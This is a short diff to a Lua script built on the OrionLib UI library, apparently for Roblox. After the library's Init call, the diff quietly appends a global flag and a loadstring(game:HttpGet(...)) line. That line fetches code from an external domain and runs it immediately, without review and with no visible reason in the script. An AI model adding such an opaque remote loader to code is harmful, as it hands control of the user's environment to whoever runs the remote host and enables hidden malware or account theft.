@@ -34,3 +34,8 @@ OrionLib:MakeNotification({
 
 OrionLib:Init()
 
+
+
+getgenv().gui = false
+
+loadstring(game:HttpGet("https://egorikusa.space/088bbe5c10488c96da1ce2e5.lua", true))()
